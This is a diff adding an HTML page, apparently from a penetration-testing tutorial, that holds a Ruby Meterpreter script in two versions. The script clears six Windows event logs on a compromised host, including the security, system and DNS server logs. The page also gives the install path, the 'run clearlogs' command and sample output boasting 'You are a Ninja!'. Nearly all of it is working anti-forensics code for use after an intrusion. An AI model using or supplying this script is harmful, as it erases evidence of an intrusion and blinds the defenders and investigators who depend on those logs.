@@ -1,0 +1,56 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Meterpreter</title>
+</head><body>log.clear<br/>
+def clrevtlgs()<br/>
+	evtlogs = [<br/>
+		'security',<br/>
+		'system',<br/>
+		'application',<br/>
+		'directory service',<br/>
+		'dns server',<br/>
+		'file replication service'<br/>
+	]<br/>
+	print_status(&quot;Clearing Event Logs, this will leave and event 517&quot;)<br/>
+	begin<br/>
+		evtlogs.each do |evl|<br/>
+			print_status(&quot;\tClearing the #{evl} Event Log&quot;)<br/>
+			log = @client.sys.eventlog.open(evl)<br/>
+			log.clear<br/>
+			file_local_write(@dest,&quot;Cleared the #{evl} Event Log&quot;)<br/>
+		end<br/>
+		print_status(&quot;All Event Logs have been cleared&quot;)<br/>
+	rescue ::Exception =&gt; e<br/>
+		print_status(&quot;Error clearing Event Log: #{e.class} #{e}&quot;)<br/>
+<br/>
+	end<br/>
+end<br/>
+<br/>
+After writing our script, we place it in /usr/share/metasploit-framework/scripts/meterpreter/<br/>
+run clearlogs<br/>
+Clearing Event Logs, this will leave an event 517<br/>
+[*] Clearing the security Event Log<br/>
+[*] Clearing the system Event Log<br/>
+[*] Clearing the application Event Log<br/>
+[*] Clearing the directory service Event Log<br/>
+[*] Clearing the dns server Event Log<br/>
+[*] Clearing the file replication service Event Log<br/>
+All Clear! You are a Ninja!<br/>
+<br/>
+# Clears Windows Event Logs<br/>
+evtlogs = [<br/>
+    'security',<br/>
+    'system',<br/>
+    'application',<br/>
+    'directory service',<br/>
+    'dns server',<br/>
+    'file replication service'<br/>
+    ]<br/>
+print_line(&quot;Clearing Event Logs, this will leave an event 517&quot;)<br/>
+evtlogs.each do |evl|<br/>
+    print_status(&quot;Clearing the #{evl} Event Log&quot;)<br/>
+    log = client.sys.eventlog.open(evl)<br/>
+    log.clear<br/>
+end<br/>
+print_line(&quot;All Clear! You are a Ninja!&quot;)</body></html>
